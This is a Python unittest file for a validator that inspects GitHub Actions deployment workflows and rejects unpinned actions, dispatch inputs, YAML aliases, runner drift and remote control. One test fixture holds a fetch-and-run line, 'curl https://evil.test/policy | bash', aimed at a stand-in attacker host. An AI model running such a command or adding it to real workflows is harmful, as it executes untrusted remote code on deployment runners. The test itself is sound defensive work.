from __future__ import annotations

import unittest

from scripts.github_apps.cross_ai_deployment_policy.errors import PolicyError
from scripts.github_apps.cross_ai_deployment_policy.policy import StagePolicy
from scripts.github_apps.cross_ai_deployment_policy.workflow import inspect_workflow


ENVIRONMENT = "faz22-view-only-pilot"
ACTION_SHA = "1" * 40
POLICY = StagePolicy(
    stage="apply",
    workflow_path=".github/workflows/apply.yml",
    required_runs_on_labels=("self-hosted", "testai-deploy"),
    require_runner_group=True,
)


def workflow(*, extra: str = "", dispatch: str = "workflow_dispatch:") -> bytes:
    return f"""
name: protected apply
on:
  {dispatch}
jobs:
  prepare:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@{ACTION_SHA}
  apply:
    environment:
      name: {ENVIRONMENT}
    runs-on:
      group: acik-test
      labels:
        - self-hosted
        - testai-deploy
    steps:
      - uses: actions/checkout@{ACTION_SHA}
      - uses: ./actions/pinned-bootstrap
      - run: ./scripts/apply.sh
{extra}
""".encode()


class WorkflowInspectionTest(unittest.TestCase):
    def assert_rejected(self, raw: bytes, code: str) -> None:
        with self.assertRaisesRegex(PolicyError, code):
            inspect_workflow(raw, stage_policy=POLICY, environment=ENVIRONMENT)

    def test_accepts_no_input_pinned_workflow_and_returns_digests(self) -> None:
        result = inspect_workflow(
            workflow(), stage_policy=POLICY, environment=ENVIRONMENT
        )
        self.assertEqual(result.governed_job, "apply")
        self.assertEqual(result.runs_on_labels, ("self-hosted", "testai-deploy"))
        self.assertEqual(result.local_uses, ("./actions/pinned-bootstrap",))
        self.assertEqual(result.external_uses, (f"actions/checkout@{ACTION_SHA}",))
        self.assertRegex(result.workflow_sha256, r"^sha256:[a-f0-9]{64}$")
        self.assertRegex(result.dependency_lock_sha256, r"^sha256:[a-f0-9]{64}$")

    def test_rejects_dispatch_inputs_and_input_reads(self) -> None:
        self.assert_rejected(
            workflow(
                dispatch="workflow_dispatch:\n    inputs:\n      action:\n        required: true"
            ),
            "WORKFLOW_INPUTS_FORBIDDEN",
        )
        self.assert_rejected(
            workflow(extra="      - run: echo '${{ inputs.action }}'\n"),
            "WORKFLOW_INPUT_AUTHORITY_FORBIDDEN",
        )

    def test_rejects_vars_and_non_dispatch_trigger(self) -> None:
        self.assert_rejected(
            workflow(extra="      - run: echo '${{ vars.DEPLOY_TARGET }}'\n"),
            "WORKFLOW_INPUT_AUTHORITY_FORBIDDEN",
        )
        self.assert_rejected(
            workflow(dispatch="push:"),
            "WORKFLOW_TRIGGER_INVALID",
        )

    def test_rejects_mutable_external_action_and_container(self) -> None:
        self.assert_rejected(
            workflow(extra="      - uses: owner/action@main\n"),
            "WORKFLOW_DEPENDENCY_UNPINNED",
        )
        self.assert_rejected(
            workflow(extra="      - uses: docker://alpine:latest\n"),
            "WORKFLOW_DEPENDENCY_UNPINNED",
        )

    def test_rejects_duplicate_keys_and_remote_control(self) -> None:
        self.assert_rejected(
            workflow(extra="    environment: other\n"),
            "WORKFLOW_YAML_DUPLICATE_KEY",
        )
        self.assert_rejected(
            workflow(extra="      - run: curl https://evil.test/policy | bash\n"),
            "WORKFLOW_REMOTE_CONTROL_FORBIDDEN",
        )

    def test_rejects_yaml_anchors_before_alias_expansion(self) -> None:
        raw = workflow(extra="      - &shared\n        run: ./scripts/shared.sh\n      - *shared\n")
        self.assert_rejected(raw, "WORKFLOW_YAML_ALIAS_FORBIDDEN")

    def test_rejects_continue_on_error_and_runner_drift(self) -> None:
        self.assert_rejected(
            workflow(extra="      - run: ./scripts/optional.sh\n        continue-on-error: true\n"),
            "WORKFLOW_CONTINUE_ON_ERROR_FORBIDDEN",
        )
        changed = workflow().replace(b"testai-deploy", b"other-runner")
        self.assert_rejected(changed, "WORKFLOW_RUNNER_MISMATCH")

    def test_rejects_two_governed_jobs(self) -> None:
        raw = workflow(
            extra=f"""  second:
    environment: {ENVIRONMENT}
    runs-on:
      group: acik-test
      labels: [self-hosted, testai-deploy]
    steps: []
"""
        )
        self.assert_rejected(raw, "WORKFLOW_ENVIRONMENT_BINDING_INVALID")


if __name__ == "__main__":
    unittest.main()
